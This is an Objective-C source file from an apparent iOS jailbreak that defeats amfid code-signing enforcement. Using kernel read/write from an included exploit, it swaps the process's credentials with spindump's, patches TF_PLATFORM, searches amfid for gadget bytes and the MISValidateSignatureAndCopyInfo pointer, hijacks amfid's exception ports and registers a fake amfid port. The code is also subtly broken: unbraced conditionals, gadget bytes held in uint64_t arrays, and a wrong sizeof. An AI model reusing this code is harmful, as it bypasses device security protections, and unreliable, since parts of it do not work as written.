//
//  amfid.m
//  reton
//
//  Created by Luca on 18.02.21.
//

#import <Foundation/Foundation.h>
#include "exploit/cicuta/cicuta_virosa.h"
#include "exploit_utilities.h"

#include "utils.h"
#include "k_utils.h"
#include "tq_common_p.h"
#include "kapi.h"

#include "log.hpp"
#include "util/mach_vm.h"

#include "manticore/amfid.h"

#include <mach/mach_traps.h>
#include <mach/vm_region.h>
#include <mach/vm_map.h>
#include <mach-o/loader.h>
#include <mach/mach_init.h>
#include <mach/host_special_ports.h>
#include <mach/mach_error.h>
#import <mach/mach_types.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread/pthread.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach-o/nlist.h>
#include <mach-o/getsect.h>
#include "k_offsets.h"
#include "kapi.h"
#include "kutils.h"

pthread_attr_t pth_commAttr = {0};
size_t amfid_fsize = 0;
uint64_t myold_cred2 = 0;

void safepatch_swap_spindump_cred(uint64_t target_proc){
    pid_t spindump_pid = 0;
    kptr_t spindump_proc_cred = KPTR_NULL;
    printf("Swapping spindump credentials with 0x%llx...\n", target_proc);
    printf("-> Spindump:\t%d\n", look_for_proc("/usr/sbin/spindump"));
    if(spindump_proc_cred == 0){
        spindump_pid = 0;
        if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
            printf("-> Spindump not running at the moment. Waiting for child process to spawn...\n");
            if(fork() == 0){
                daemon(1, 1);
                close(STDIN_FILENO);
                close(STDOUT_FILENO);
                close(STDERR_FILENO);
                printf("-> Spawning child process... (%d)\n", execvp("/usr/sbin/spindump", NULL));
                exit(1);
            } while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
                // While Spindump is not running...
            }
        }
        printf("-> Pausing spindump process...\n");
        kill(spindump_pid, SIGSTOP);
        printf("-> Spindump pid:\t%d\n", spindump_pid);
        kptr_t spindump_proc = kproc_find_by_pid(spindump_pid);
        printf("-> Spindump proc:\t0x%llx\n", spindump_proc);
        kptr_t spindump_proc_cred = kapi_read_kptr(spindump_proc + OFFSET(proc, p_ucred));
        printf("-> Spindump cred:\t0x%llx\n", spindump_proc_cred);
        kptr_t target_task = kapi_read_kptr(target_proc + OFFSET(proc, task));
        printf("-> target task:\t\t0x%llx\n", target_task);
        patch_TF_PLATFORM(target_task);
        printf("-> TF_PLATFORM patched\n");
        myold_cred2 = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
        if(kapi_write64(target_proc + OFFSET(proc, p_ucred), spindump_proc_cred)) printf("-> Successfully swapped spindump credentials.\n");
    }
}


void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

uint8_t *map_file_to_mem(const char *path){
    struct stat fstat = {0};
    stat(path, &fstat);
    amfid_fsize = fstat.st_size;
    
    int fd = open(path, O_RDONLY);
    uint8_t *mapping_mem = (uint8_t*)mmap(NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
    if((uintptr_t)mapping_mem == -1){
        printf("Error in map_file_to_mem(): mmap() == -1\n");
        exit(1);
    }
    return mapping_mem;
}

uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
    const char *_segment = "__TEXT", *_section = "__text";
    const struct section_64 *sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    if(!sect_info){
        printf("Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
        exit(1);
    }
    unsigned long sect_size = 0;
    uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
    
    uint64_t _bytes_gadget[] = {
        0x08, 0x29, 0x09, 0x9B, // madd    x8, x8, x9, x10
        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    uint64_t _bytes_gadget2[] = {
        0x08, 0x25, 0x2A, 0x9B, // smaddl    x8, w8, w10, x9
        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    uint64_t _bytes_gadget3[] = {
        0x08, 0xBD, 0x48, 0xCA, // eor        x8, x8, x8, lsr #47
        0x00, 0x7D, 0x09, 0x9B, // mul        x0, x8, x9
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    printf("-> Looking for needle #1...\n");
    uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
    if(!find_gadget)
        printf("-> Looking for needle #2...\n");
        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
    if(!find_gadget)
        printf("-> Looking for needle #3...\n");
        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget3, sizeof(_bytes_gadget2));
    if(!find_gadget){
        printf("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
    }
    
    return (find_gadget - sect_data) + sect_info->offset;
}



uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t *amfid_macho){
    uint32_t MISValidate_symIndex = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)(mh + 1);
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SYMTAB:{
                struct symtab_command *sym_cmd = (struct symtab_command*)cmd;
                uint32_t symoff = sym_cmd->symoff;
                uint32_t nsyms = sym_cmd->nsyms;
                uint32_t stroff = sym_cmd->stroff;
                
                for(int i =0;i<nsyms;i++){
                    struct nlist_64 *nn = (nlist_64*)((char*)mh+symoff+i*sizeof(struct nlist_64));
                    char *def_str = NULL;
                    if(nn->n_type==0x1){
                        // 0x1 indicates external function
                        def_str = (char*)mh+(uint32_t)nn->n_un.n_strx + stroff;
                        if(!strcmp(def_str, "_MISValidateSignatureAndCopyInfo")){
                            break;
                        }
                    }
                    if(i!=0 && i!=1){ // Two at beginning are local symbols, they don't count
                        MISValidate_symIndex++;
                    }
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    
    if(MISValidate_symIndex == 0){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): MISValidate_symIndex == 0\n");
        exit(1);
    }
    
    const struct section_64 *sect_info = NULL;
    if(g_exp.has_PAC){
        const char *_segment = "__DATA_CONST", *_segment2 = "__DATA", *_section = "__auth_got";
        // _segment for iOS 13, _segment2 for <= iOS 12
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
        if(!sect_info)
            sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment2, _section);
    }else{
        const char *_segment = "__DATA", *_section = "__la_symbol_ptr";
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    }
    
    if(!sect_info){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): if(!sect_info)\n");
        exit(1);
    }
    
    return sect_info->offset + (MISValidate_symIndex * 0x8);
}

/**
	binary_load_address(mach_port_t target_port) ---> returns kptr_t object/addresss
		 Function to find the binary load address of amfid in memory.
**/


kptr_t binary_load_address(mach_port_t target_port){
    kern_return_t err;
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL;
    mach_vm_size_t target_first_size = 0x1000;
    mach_vm_address_t target_first_addr = 0x0;
    struct vm_region_basic_info_64 region = {0};
    
    err = mach_vm_region(target_port,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);
    
    if (err != KERN_SUCCESS) {
        printf("failed to get the region err: %d\t(%s)\n", err, mach_error_string(err));
        return 0;
    }
    
    return target_first_addr;
}


void* amfid_exception_handler(void* arg){
    return NULL;
}

void set_exception_handler(mach_port_t amfid_task_port){
    // allocate a port to receive exceptions on:
    mach_port_t amfid_exception_port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
    mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);
    kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                 EXC_MASK_ALL,
                                                 amfid_exception_port,
                                                 EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                                 6);
    
    if (err != KERN_SUCCESS){
        (printf)("error setting amfid exception port: %s\t(%d)\n", mach_error_string(err), err);
    } else {
        (printf)("set amfid exception port: succeed!\n");
    }
    
    pthread_t exception_thread;
    pthread_create(&exception_thread, &pth_commAttr, amfid_exception_handler, NULL);
}

/***
 Replace the Original Amfid task port with a custom one, created by us. (https://github.com/bazad/blanket/blob/22d670d25b8ab5ad569c3f8f4de108ae8e0b6e0a/amfidupe/amfidupe.c#L93)
 */

bool replace_amfid_port(){
	mach_port_t real_amfid_port, fake_amfid_port;
	mach_port_t host = mach_host_self();
	kern_return_t kr = host_get_amfid_port(host, &real_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not get amfid's service port!\n");
		return false;
	}
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kr = mach_port_construct(mach_task_self(), &options, 0, &fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not create fake amfid port!\n");
		return false;
	}
	kr = host_set_amfid_port(host, fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not register fake amfid port: error %d\n", kr);
		return false;
	}
	manticore_info("Registered new amfid port: 0x%x\n", fake_amfid_port);
	return true;
}

kptr_t perform_amfid_patches(){
    printf("* ------- AMFID Patches -------- *\n");
    uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
    printf("Extracted AMFID Offsets:\n");
    
    /** Finding Amfid related offsets */
    kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
    printf("----> MISValidate:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
    kptr_t amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
    printf("----> Gadget:\t0x%llx\n", amfid_OFFSET_gadget);
    /** Map amfid to local memory */
    munmap(amfid_fdata, amfid_fsize);
    safepatch_swap_spindump_cred(g_exp.self_proc);
    if(getuid() != 0) return 1;
    mach_port_t amfid_task_port = MACH_PORT_NULL;
    kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
    if(ret == KERN_SUCCESS){
        printf("amfid port:\t0x%x\n", amfid_task_port);
        set_exception_handler(amfid_task_port);
        kptr_t amfid_base = binary_load_address(amfid_task_port);
        printf("amfid base:\t0x%llx\n", amfid_base);
	} else manticore_error("Could not get amfid's service port!\n");
    return 0;
}
